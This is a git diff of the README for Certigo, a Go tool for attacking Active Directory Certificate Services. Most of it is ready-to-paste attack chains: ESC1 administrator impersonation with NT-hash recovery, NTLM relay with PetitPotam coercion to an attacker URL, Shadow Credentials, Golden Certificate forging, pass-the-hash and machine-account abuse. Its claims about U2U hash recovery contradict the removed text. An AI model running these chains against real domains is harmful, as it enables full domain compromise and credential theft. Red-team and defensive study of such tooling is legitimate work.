@@ -1,37 +1,51 @@
 # Certigo
 
-ADCS enumeration and exploitation tool in Go.
+<p align="center">
+  <strong>AD CS enumeration and exploitation tool in Go — Certipy parity in a single static binary.</strong>
+</p>
 
-Certigo is a single static binary that enumerates Active Directory Certificate Services, detects ESC1 through ESC16 misconfigurations, and wires up the follow-on attacks (Shadow Credentials, Golden Certificate, PKINIT, NTLM relay, coercion, RBCD). Built on top of `gokrb5`, `go-ldap`, `go-msrpc`, and `go-pkcs12`. Pure Go, no cgo, cross-compiles to Linux, Windows, and macOS on amd64 and arm64.
+Certigo enumerates Active Directory Certificate Services, detects ESC1–ESC16 misconfigurations, and wires up the follow-on attacks (Shadow Credentials, Golden Certificate, PKINIT, NTLM relay, coercion, RBCD). Built on `gokrb5`, `go-ldap`, `go-msrpc`, `go-ntlmssp`, and `go-pkcs12`. Pure Go, no cgo, cross-compiles to linux / windows / darwin × amd64 / arm64.
 
 ## Install
 
-### From source
-
-```
+```bash
 go install github.com/ajm4n/certigo/cmd/certigo@latest
+# or download a release binary from the Releases page
 ```
 
-### Binaries
+## TL;DR
 
-Download from [Releases](https://github.com/ajm4n/certigo/releases) for `linux/amd64`, `linux/arm64`, `windows/amd64`, `windows/arm64`, `darwin/amd64`, `darwin/arm64`.
+```bash
+# enumerate every CA + template, run ESC1-16 detection, pretty table
+certigo find -d corp.local -u alice -p Pass123 --dc-host 10.0.0.1 --vulnerable --short
+
+# request an ESC1 cert via /certsrv/ web enrollment (NTLM-over-HTTP, HTTP fallback)
+certigo req -d corp.local -u alice --hashes :NTHASH \
+            --ca ca.corp.local --ca-name CORP-CA --template ESC1 \
+            --upn administrator@corp.local --dc-host 10.0.0.1 \
+            --method web --insecure-tls --out admin.pfx
+
+# PKINIT with the issued PFX, drop a TGT, recover the NT hash via U2U + unPAC
+certigo auth --pfx admin.pfx --domain corp.local --dc-ip 10.0.0.1 --principal administrator
+```
 
 ## Subcommands
 
 | Command | What it does |
 |---|---|
-| `find` | Enumerate CAs, templates, and detect ESC1 through ESC16 vulnerabilities. Output as text, JSON, zip bundle, or BloodHound edges. |
-| `auth` | Obtain a TGT via password, NT hash, or PKINIT (`--pfx`). Writes the ticket to a ccache. |
-| `cert` | Convert between PFX and PEM, extract the key or certificate, change passwords. |
-| `shadow` | Add, list, view, clear, or remove `msDS-KeyCredentialLink` entries (Shadow Credentials). |
-| `forge` | Sign a certificate with a stolen CA private key (Golden Certificate), including the `NTDS-CA-Security-Ext` SID binding. |
-| `template` | Read, write, back up, or restore an AD CS template via LDAP. Includes an ESC4 `make-vulnerable` preset. |
-| `account` | Create, modify, or delete AD user and computer accounts via LDAP. |
-| `ca` | Manage a CA over DCOM: backup the signing cert, approve or deny pending requests, add or remove officers, publish or unpublish templates. |
-| `req` | Request a certificate via `/certsrv/` web enrollment or ICPR over RPC. |
-| `ptt` | Convert a kirbi file to a ccache, or pass through an existing ccache to `$KRB5CCNAME`. |
-| `parse` | Parse AD CS registry dumps (`.reg`). |
-| `relay` | Listen for inbound NTLM, relay it to AD CS web enrollment, save a PFX for each victim. Includes PetitPotam, DFSCoerce, and PrinterBug auth coercion. |
+| `find` | Enumerate every CA + template, run ESC1-ESC16 detection. Filters: `--enabled`, `--vulnerable`, `--enrollable`, `--esc ESC1,ESC4`. Formats: `text`, `short`, `json`, `zip`, `bloodhound`. |
+| `auth` | PKINIT with a PFX, write the TGT to a ccache, optionally `--print` the NT hash via U2U + unPAC-the-hash. |
+| `req` | Request a cert via DCOM (default), ICPR over RPC (`--method rpc`), or `/certsrv/` web enrollment (`--method web`). NTLM-over-HTTP with auto-fallback HTTPS → HTTP, supports password and pass-the-hash. |
+| `shadow` | Add / list / view / clear / remove `msDS-KeyCredentialLink` entries on a target user (Shadow Credentials). Drops a PFX with the new key. |
+| `forge` | Sign a Golden Certificate with a stolen CA private key (CN=ANY user impersonation). Writes the `NTDS-CA-Security-Ext` SID extension so the cert passes KB5014754 strong mapping. |
+| `template` | Read / write / backup / restore a template via LDAP. `--action make-vulnerable` flips a writable template into ESC1-style enrollee-supplies-subject + Client Auth EKU. |
+| `account` | Create / modify / delete user + computer accounts via LDAP (e.g. add a fake computer for RBCD bypassing MachineAccountQuota). |
+| `ca` | DCOM ops on a CA: backup signing cert, approve / deny pending requests, add / remove officers, publish / unpublish templates. |
+| `req` | (see above) — covers DCOM / RPC / web enrollment paths. |
+| `relay` | Listen for HTTP NTLM, relay to `/certsrv/`, drop a PFX per victim. Includes built-in PetitPotam / DFSCoerce / PrinterBug triggers via `--trigger`. |
+| `cert` | Local PFX ↔ PEM conversion, key extraction, password change. |
+| `parse` | Offline parse of AD CS EVTX logs and registry hives (`.reg`). |
+| `ptt` | kirbi → ccache, or pass an existing ccache to `$KRB5CCNAME`. |
 
 Every subcommand takes `certigo <cmd> --help` for the full flag set.
 
@@ -39,286 +53,122 @@ Every subcommand takes `certigo <cmd> --help` for the full flag set.
 
 Most subcommands accept the same authentication and transport flags:
 
-```
--u, --username          AD username (e.g. alice)
--p, --password          AD password
-    --hashes            LMHASH:NTHASH (LM half may be empty: ":NTHASH")
--d, --domain            AD domain or realm (e.g. corp.local)
--k, --kerberos          use Kerberos GSSAPI bind (with --dc-host)
-    --dc-host           domain controller host or IP
-    --port              LDAP port (389, or 636 for LDAPS)
-    --ldaps             force LDAPS
-    --ldap-insecure     skip TLS verification on LDAPS
-```
+| Flag | Meaning |
+|---|---|
+| `-d`, `--domain` | AD domain (e.g. `corp.local`) |
+| `-u`, `--username` | sAMAccountName |
+| `-p`, `--password` | password |
+| `--hashes LM:NT` | NTLM hashes (LM may be empty: `:NTHASH`) — pass-the-hash |
+| `--dc-host`, `--dc-ip` | KDC / DC hostname or IP |
+| `-k`, `--kerberos` | use Kerberos (GSSAPI) bind via the ccache in `$KRB5CCNAME` |
+| `--ldaps` | use LDAPS (auto-enabled for port 636) |
+| `--ldap-insecure` | skip TLS cert verification on LDAPS |
+| `--simple-bind` | LDAP simple bind (default: NTLM) |
+| `--pfx`, `--pfx-password` | PFX-based auth where supported (`auth`, `shadow`) |
+| `--pem-cert`, `--pem-key` | PEM cert / key pair where PFX isn't a fit |
 
-## Usage by subcommand
+## End-to-end ESC1 chain
 
-### find
+```bash
+# 1. find a vulnerable template
+certigo find -d corp.local -u alice -p Pass123 --dc-host 10.0.0.1 --vulnerable --short
 
-Enumerate every AD CS CA and template in the forest and flag vulnerable templates.
+# 2. request an admin cert via that template (web enrollment, NTLM-over-HTTP)
+certigo req  -d corp.local -u alice -p Pass123 \
+    --ca ca.corp.local --ca-name CORP-CA \
+    --template ESC1 --upn administrator@corp.local \
+    --dc-host 10.0.0.1 --method web --insecure-tls --out admin.pfx
 
-```
-certigo find \
-  -u alice -p Passw0rd -d corp.local \
-  --dc-host dc01.corp.local
-```
-
-Progress output goes to stderr (`[*]` / `[+]` / `[!]`); the actual report goes to stdout.
-
-**Filters (compose freely):**
-
-```
---enabled        # only templates published on at least one CA
---vulnerable     # only templates with at least one ESC finding
---enrollable     # only templates the bound principal can enrol in
+# 3. PKINIT with the cert + recover the NT hash
+certigo auth --pfx admin.pfx --domain corp.local --dc-ip 10.0.0.1 --principal administrator --print
+# corp.local\administrator:0:LM:NT:::
 ```
 
-`--enabled --vulnerable --enrollable` is the attack-ready shortlist.
+## ESC8 (NTLM relay → AD CS web enrollment)
 
-**Output formats:**
+```bash
+# 1. listen for inbound HTTP NTLM, relay to the CA
+certigo relay --listen :80 --target http://ca.corp.local/certsrv/ \
+              --template DomainController --out-dir ./loot &
 
-- `--format text` (default) - full Certipy-style section dump with resolved SIDs, EKU names, policies.
-- `--format json` - structured output.
-- `--format zip` - bundle containing txt + json + per-CA `.crt` + per-template json.
-- `--format bloodhound` - BloodHound CE OpenGraph edges (`ADCSESC1`..`ADCSESC16`) plus resolved principal nodes.
-- `--short` (or `--format short`) - one-line-per-template table with `TEMPLATE / ENABLED / VULN / ENROLL / ESCs / PUBLISHED-ON`. Headers and status cells are colored when stdout is a tty.
+# 2. trigger a coerced auth from a target DC
+certigo relay --trigger petitpotam --target-host dc.corp.local \
+              --attacker-url 'http://attacker/foo' -d corp.local -u alice -p Pass123
 
-**Exploit hints:**
-
-```
---vulnerable --howto
-```
-
-prints a ready-to-paste `To exploit, run:` command under each ESC finding.
-
-**LDAP transport:**
-
-```
---scheme ldap | --scheme ldaps       # certipy-compatible flag
---ldaps                              # alias
---port 389|636
---ldap-insecure                      # skip TLS verify
+# 3. PKINIT with the captured DC machine cert
+certigo auth --pfx ./loot/DC01\$.pfx --domain corp.local --dc-ip 10.0.0.1 --principal 'DC01$' --print
 ```
 
-Plain LDAP bind auto-retries on `:636` with `InsecureSkipVerify=true` when the DC rejects the initial bind with `strongerAuthRequired` / `confidentialityRequired`.
+## Shadow Credentials
 
-**Drop into an LDAP REPL:**
+```bash
+# add a key cred to alice, drop a PFX we can PKINIT with
+certigo shadow add --target alice -d corp.local -u attacker -p ... \
+                   --dc-host 10.0.0.1 --out alice.pfx
 
-```
-certigo find ... --ldap-shell
-```
-
-Runs the full enumeration first, then hands you an interactive shell bound as the current principal. See the `shell` section below.
-
-### auth
-
-Get a TGT. Three modes: password, NT hash, PKINIT.
-
-```
-# Password
-certigo auth -u alice -p Passw0rd -d corp.local --dc-host dc01.corp.local \
-  --out-ccache alice.ccache
-
-# NT hash
-certigo auth -u alice --hashes :a4f49c406510bdcab6824ee7c30fd852 \
-  -d corp.local --dc-host dc01.corp.local --out-ccache alice.ccache
-
-# PKINIT (from a PFX obtained via shadow, req, or forge)
-certigo auth -u alice -d corp.local --dc-host dc01.corp.local \
-  --pfx alice.pfx --pfx-password '' --out-ccache alice.ccache
-
-export KRB5CCNAME=$PWD/alice.ccache
+# PKINIT as alice
+certigo auth --pfx alice.pfx --domain corp.local --dc-ip 10.0.0.1 --principal alice --print
 ```
 
-**Drop straight into an LDAP shell bound as the cert's principal:**
+## Golden Certificate
 
-```
-certigo auth -u Administrator -d corp.local --dc-host dc01.corp.local \
-  --pfx admin.pfx --ldap-shell
-```
+```bash
+# 1. backup the CA signing cert + key (requires CA admin)
+certigo ca backup --ca-name CORP-CA --dc-host 10.0.0.1 \
+                  -d corp.local -u admin -p ... --out corp-ca.pfx
 
-Flow: PKINIT AS-REQ -> TGT written to ccache -> LDAPS GSSAPI bind using that TGT -> REPL. Works the same way `certipy auth -ldap-shell` does.
+# 2. forge a cert for any user with the right SID extension
+certigo forge --ca-pfx corp-ca.pfx --upn administrator@corp.local \
+              --sid S-1-5-21-...-500 --out admin-forged.pfx
 
-### LDAP shell
-
-Available via `certigo find --ldap-shell` (after enumeration) or `certigo auth --ldap-shell` (after a PFX-based PKINIT auth).
-
-Commands:
-
-```
-help                                 list commands
-whoami
-search <ldap-filter> [attr1,attr2]   up to 10 results
-dn <sAMAccountName>                  resolve DN
-get <dn-or-sam>                      dump every attribute
-add_computer <name> <password>       create a computer account (MAQ abuse)
-add_user <name> <password>           create a user
-add_user_to_group <user> <group>
-set_rbcd <source-sam> <target-sam>   set msDS-AllowedToActOnBehalfOfOtherIdentity
-clear_rbcd <target-sam>
-change_password <user> <new-password>
-disable_account <user>
-enable_account <user>
-exit | quit
+# 3. PKINIT
+certigo auth --pfx admin-forged.pfx --domain corp.local --dc-ip 10.0.0.1 --principal administrator --print
 ```
 
-### cert
+## Output
 
 ```
-# PFX to PEM
-certigo cert --pfx alice.pfx --pfx-password '' --out-pem alice.pem
+====== Certificate Authorities ======
 
-# Extract just the key
-certigo cert --pfx alice.pfx --extract-key > alice.key
+  0
+  CA Name                               : CORP-CA
+  DNS Name                              : ca.corp.local
+  Web Enrollment NTLM Offered           : Yes
+  Enrollment Rights                     :
+    Domain Users (ControlAccess)
+    ...
 
-# Re-encrypt a PFX with a new password
-certigo cert --pfx alice.pfx --out-pfx alice-pwd.pfx --out-password 'hunter2'
+====== Certificate Templates ======
+
+  0
+  Template Name                         : ESC1
+  Enabled                               : Yes
+  Schema Version                        : 2
+  Enrollee Supplies Subject             : Yes
+  Requires Manager Approval             : No
+  Extended Key Usage                    :
+    Client Authentication (1.3.6.1.5.5.7.3.2)
+  Enrollment Rights                     :
+    Domain Users (ControlAccess)
+    Authenticated Users (ControlAccess)
+  [!] Vulnerabilities
+    [!] ESC1 - Template allows enrollee-supplied subject with client-auth EKU
 ```
 
-### shadow
+`certigo find --short` collapses to a one-line-per-template summary; `--format json` / `--format zip` is what you want for piping into another tool; `--format bloodhound` emits the four BloodHound JSON shards (CertTemplates, EnterpriseCAs, RootCAs, AIACAs).
 
-```
-# Add a key credential; writes bob.pfx for PKINIT follow-up
-certigo shadow -u alice -p Passw0rd -d corp.local \
-  --dc-host dc01.corp.local --action add \
-  --target-dn 'CN=bob,CN=Users,DC=corp,DC=local' \
-  --out bob.pfx
+## Building
 
-# List / clear / remove one entry
-certigo shadow ... --action list --target-dn '...'
-certigo shadow ... --action clear --target-dn '...'
-certigo shadow ... --action remove --device-id <hex> --target-dn '...'
+```bash
+git clone https://github.com/ajm4n/certigo
+cd certigo
+go build ./cmd/certigo
+# or
+make release        # cross-build via goreleaser
 ```
 
-### forge
-
-```
-certigo forge \
-  --ca-pfx ca.pfx --ca-password '' \
-  --upn Administrator@corp.local \
-  --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
-  --validity-days 3650 --key-size 2048 \
-  --out admin.pfx
-```
-
-### template
-
-```
-# Dump all attributes of a template
-certigo template -u alice ... --name User --action read
-
-# Make a template ESC1-exploitable (requires Write on the template)
-certigo template -u alice ... --name VulnTemplate --action make-vulnerable \
-  --file backup.json
-
-# Roll back
-certigo template -u alice ... --name VulnTemplate --action restore --file backup.json
-```
-
-### account
-
-```
-# Create a computer account (MachineAccountQuota abuse)
-certigo account -u alice -p Passw0rd -d corp.local --dc-host dc01.corp.local \
-  --action create --type computer --target PWN01 --password 'BlahBlah1234!'
-
-# Read every attribute
-certigo account ... --action read --target alice
-```
-
-### ca
-
-```
-# Publish a template on the CA
-certigo ca -u alice ... --ca-name CORP-CA --add-template VulnTemplate
-
-# List officers (ACE holders on the CA object)
-certigo ca -u alice ... --ca-name CORP-CA --list-officers
-
-# Approve a pending request (DCOM)
-certigo ca -u alice ... --ca-name CORP-CA --issue-request 42
-
-# Add a new CA officer (DCOM Get/SetOfficerRights)
-certigo ca -u alice ... --ca-name CORP-CA --add-officer S-1-5-21-...
-```
-
-### req
-
-```
-# Web enrollment
-certigo req --ca ca01.corp.local --ca-name CORP-CA --template User \
-  -u 'corp\alice' -p Passw0rd \
-  --upn alice@corp.local --out alice.pfx
-
-# ICPR RPC (port 135 + dynamic)
-certigo req --method rpc --ca ca01.corp.local --ca-name CORP-CA --template User \
-  -u 'corp\alice' -p Passw0rd --upn alice@corp.local --out alice.pfx
-```
-
-### ptt
-
-```
-# Kirbi to ccache (writes to $KRB5CCNAME if --out-ccache is omitted)
-certigo ptt --kirbi ticket.kirbi --out-ccache ticket.ccache
-
-# ccache pass-through
-certigo ptt --ccache in.ccache --out-ccache $KRB5CCNAME
-```
-
-### parse
-
-```
-certigo parse --file caconfig.reg --format text
-certigo parse --file caconfig.reg --format json
-```
-
-### relay
-
-```
-# Listen on :80, relay to /certsrv/, coerce a victim via PetitPotam
-certigo relay \
-  --listen :80 \
-  --target https://ca01.corp.local/certsrv/ \
-  --template User \
-  --trigger petitpotam \
-  --target-host victim.corp.local \
-  --attacker-url http://attacker.local/cg \
-  --out-dir ./loot
-```
-
-On each successful relay the victim's PFX is saved as `./loot/<victim>.pfx`.
-
-## Build
-
-```
-make build        # build the binary at ./certigo
-make test         # run the unit tests (144 across 22 packages)
-make lint         # golangci-lint
-make lab-up       # bring up a local samba + mock-adcs docker lab
-make lab-down     # tear it down
-```
-
-Go 1.24 or newer is required. No cgo dependencies.
-
-## Docker lab
-
-`lab/docker/compose.yml` brings up `samba-ad-dc` for real LDAP / Kerberos plus an in-repo `mock-adcs` HTTP stub. Useful for integration-testing `find`, `auth`, `shadow`, `account`, and `template` without a real Windows server. See `lab/docker/README.md` for the quickstart.
-
-AD CS itself does not run on Linux, so end-to-end `req` / `ca` / `forge` testing requires a real Windows Server CA.
-
-## Scope and limitations
-
-- `auth --pfx` performs PKINIT AS-REQ / AS-REP with DH, and writes the resulting TGT to a ccache. U2U / unPAC-the-hash is not wired yet.
-- `ca --backup` currently retrieves the CA signing certificate via `GetCAProperty`; the full private-key backup over `BackupPrepare / OpenFile / ReadFile` is not implemented.
-- `parse` handles `.reg` text dumps. `.evtx` returns a clear error and points at Certipy, pending a pure-Go EVTX reader.
-- `relay` implements the HTTP(S) NTLM MITM plus coercion triggers, but does not rewrite NTLM signing or channel-binding tokens, so CAs with EPA / SMB signing enforced will reject the relayed `AUTHENTICATE`.
-
-Everything else is feature-complete against Certipy v5.0.3. File an issue or a PR when something misbehaves.
+Pure Go, no cgo. Go 1.22+. Single static binary.
 
 ## License
 
-MIT. See [LICENSE](LICENSE).
-
-## Credits
-
-Certigo is heavily based on [Oliver Lyak's Certipy](https://github.com/ly4k/Certipy) and on the SpecterOps "Certified Pre-Owned" research (Will Schroeder and Lee Christensen). Subcommand shape, flag names, ESC detection logic, and output conventions all take directly from Certipy. All original AD CS research credit belongs to those authors; certigo just re-implements the tooling in Go so it can ship as a single static binary for red-team engagements.
+MIT.
